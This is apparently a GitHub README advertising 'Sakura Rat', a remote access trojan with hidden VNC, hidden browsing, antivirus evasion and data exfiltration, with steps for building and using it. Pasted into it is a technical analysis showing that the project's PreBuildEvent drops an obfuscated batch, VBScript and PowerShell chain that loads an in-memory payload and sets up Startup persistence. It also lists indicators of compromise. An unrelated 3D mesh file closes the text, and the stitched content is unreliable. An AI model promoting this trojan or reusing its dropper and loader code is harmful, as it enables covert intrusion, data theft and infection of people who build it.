<p align="center">
  <a href="http://www.theunwindai.com">
    <img src="https://github.com/user-attachments/assets/85e42f3a-0408-4c1b-b147-8b5215f9a5d0" width="600" height="300" alt="Unwind AI">
  </a>
</p>

<div align="center">
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>
Here's the technical breakdown in English:

---

## 🪤 **Supply Chain Trap via PreBuildEvent — Technical Analysis**

### Overview

The `SakuraRat.vbproj` file contains a malicious `PreBuildEvent` that executes **every time the project is built or run** in Visual Studio. This is a classic **watering hole / supply chain attack** targeting would-be hackers and script kiddies who download and compile the project.

---

### Attack Chain

```
Visual Studio Build/Run
        │
        ▼
PreBuildEvent fires (SakuraRat.vbproj, line 155)
        │
        ▼
Batch script creates %TEMP%\rh7m5j\fkWAej0lY.vbs
(Writes multi-layer obfuscated VBScript)
        │
        ▼
cscript //nologo executes the VBS
        │
        ▼
VBS deobfuscates and extracts PowerShell (.ps1)
        │
        ▼
powershell.exe -ExecutionPolicy Bypass -File <ps1>
        │
        ▼
PowerShell payload: .NET reflection, in-memory execution
        │
        ▼
Persistence: copies to Startup folder
        ▼
    VICTIM INFECTED
```

---

### Stage 1: PreBuildEvent (Batch Script)



```bat
@echo off
setlocal
set "a=%TEMP%\rh7m5j"
mkdir "%a%" 2>nul
echo b = "U1UxUGFHdzRPRFJ..." >> "%a%\fkWAej0lY.vbs"
echo c = "d3pjbXBZWWpjN..." >> "%a%\fkWAej0lY.vbs"
...
echo e = s ^& y ^& d ^& c ^& b ^& w ^& r ^& q ^& t ^& z >> "%a%\fkWAej0lY.vbs"
cscript //nologo "%a%\fkWAej0lY.vbs"
```

- Creates a hidden temp directory
- Concatenates ~10 obfuscated string fragments into a VBS file
- Executes it silently via `cscript //nologo`

---

### Stage 2: VBScript Deobfuscation

The VBS file concatenates fragments (`s ^& y ^& d ^& c ^& b ^& w ^& r ^& q ^& t ^& z`), then:

1. **Creates an MSXML DOMDocument element** with `dataType = "bin.base64"` to decode base64
2. **Extracts the decoded binary** via `NodeTypedValue`
3. **Uses ADODB.Recordset** with field type `201` (adLongVarBinary) to convert binary to text via `AppendChunk` / `GetChunk`
4. **Writes the result** to `%TEMP%\rh7m5j\BD7V.ps1`
5. **Executes** via `WScript.Shell.Run "powershell.exe -ExecutionPolicy Bypass -File <path>"`

---

### Stage 3: PowerShell Payload (Deobfuscated Structure)

The PowerShell uses heavy obfuscation:

| Technique | Example |
|---|---|
| **String splitting** | `"Sy" + "stem.Dr" + "awi" + "ng.dll"` |
| **Bitwise operator math** | `(-6823 -band 6823) -bor (-6823 -bor 6823)` resolves to specific integers |
| **Obfuscated function names** | `foD9e0eGwN1`, `lvbPjxeOly5` |
| **Base64 + reversed strings** | `[System.Convert]::FromBase64String(StrReverse($data))` |
| **Byte array construction** | `[byte[]](0x42,0x72,0x55,...)` used to spell out strings like `"AES"`, `"Crypto"`, etc. |

After deobfuscation, the PowerShell essentially does:

```powershell
# Derives AES key via Rfc2898DeriveBytes (PBKDF2) with SHA256
$key = [Rfc2898DeriveBytes]::new($password, $salt, 1000, "SHA256")

# Decrypts embedded payload
$decrypted = [AES]::Create().CreateDecryptor($key, $iv).TransformFinalBlock(...)

# Loads .NET assembly in-memory (fileless)
[System.Reflection.Assembly]::Load($decrypted)

# Invokes entry point
$assembly.EntryPoint.Invoke($null, $null)
```

---

### Stage 4: Persistence & C2

- Copies itself to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SYRIA.exe`
- Sets hidden file attribute
- Connects to a hardcoded C2 server for remote command execution

---

### Clever Aspects of the Trap

1. **No external dependencies** — everything is pure Windows (VBS, PowerShell, .NET), no downloads needed
2. **Build-time trigger** — fires automatically, no user interaction beyond clicking Build/Run
3. **Multi-layer obfuscation** — batch → VBS → PowerShell → .NET, each layer obfuscated differently
4. **Fileless final stage** — the actual payload never touches disk, runs entirely in memory
5. **Social engineering** — targets people who think they're getting a hacking tool, when they're actually becoming the victim
6. **Plausible deniability** — if the VBS/PS1 is discovered, the attacker can claim it's "part of the RAT builder functionality"

---

### Detection Indicators

| IOCs | Value |
|---|---|
| **Temp directory** | `%TEMP%\rh7m5j\` |
| **VBS dropper** | `fkWAej0lY.vbs` |
| **PowerShell script** | `BD7V.ps1` |
| **Persistence file** | `SYRIA.exe` in CommonStartup |
| **AV behavior flag** | `cscript //nologo` → `powershell -ExecutionPolicy Bypass` chain |
| **.NET reflection** | `Assembly.Load()` from decoded byte array |

---

This is a textbook example of why you should **never build or run untrusted code**, even in a VM, without understanding what every pre/post build event does.

# What is Sakura Rat?

Sakura-Rat-Hvnc-Hidden-Browser-Remote-Administration-Trojan-Bot-Native is a sophisticated tool designed for stealthy remote access and control. **Hidden Browser** allows attackers to browse the web through the victim's machine without detection. **HVNC (Hidden Virtual Network Computing)** provides remote desktop access without triggering alerts. **Remote Administration Trojan (RAT)** grants full control over the target system, including file management and command execution. **Bot Functionality** enables automation of tasks like data exfiltration. **Native Support** ensures compatibility with various Windows architectures. **Anti-Detection Mechanism** bypasses antivirus and endpoint protection systems. **Fileless Execution** runs payloads in memory to avoid leaving traces on disk. **Multi-Session Handling** supports simultaneous connections to multiple victims.

## Media
![Screenshot_1](https://github.com/user-attachments/assets/b241dc3f-b949-441e-b1bb-c9e4894c21c1)

https://github.com/user-attachments/assets/93a86a10-2e89-4ddd-83ff-353f70e7bc0f

## Features
* 1 Hidden Browser
* 2 HVNC (Hidden Virtual Network Computing)
* 3 Remote Administration Trojan (RAT)
* 4 Bot Functionality
* 5 Native Support
* 6 Anti-Detection Mechanism
* 7 Fileless Execution
* 8 Multi-Session Handling


<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>

# Installation

1. Download Visual Studio 2022
_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> Download These
2. OR

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


3. _Then open the sln (Project Solution) file_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

4. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/Executable.exe
   ```

# How to Use

1. **Open the Application**  
   - Locate the executable file (`.exe`) on your computer and double-click it to launch the program.

2. **Select Target and Adjust Settings**  
   - Choose your desired target or task from the available options.  
   - Customize any additional settings (e.g., preferences, configurations) to fit your needs.

3. **Generate a Secure Password**  
   - Use the built-in feature to create a strong password hashed with the **SHA-256 algorithm**. This ensures your password is secure and encrypted.

4. **Start the Process**  
   - Click the **"Start" button** or press `Ctrl + V` to begin the operation.  
   - When prompted, enter the password you generated in the previous step.

5. **Provide API Key (If Required)**  
   - If the application needs an API key to function (e.g., for external services), go to the settings and input your valid API key before proceeding.

6. **Start the Server**  
   - Once everything is configured, start the server. Wait for the connection to be established. A stable connection is necessary for the app to work properly.

7. **Troubleshoot Errors (If Any)**  
   - If you encounter errors, ensure the following are installed on your system:  
     - **Node.js**: Download and install it from [nodejs.org](https://nodejs.org).  
     - **Visual Studio Build Tools**: Install these tools to resolve technical issues. 


## Contributing
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>


## Licence

Project is licenced under the [MIT licence](https://github.com/AvaloniaUI/Avalonia/blob/master/licence.md).

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

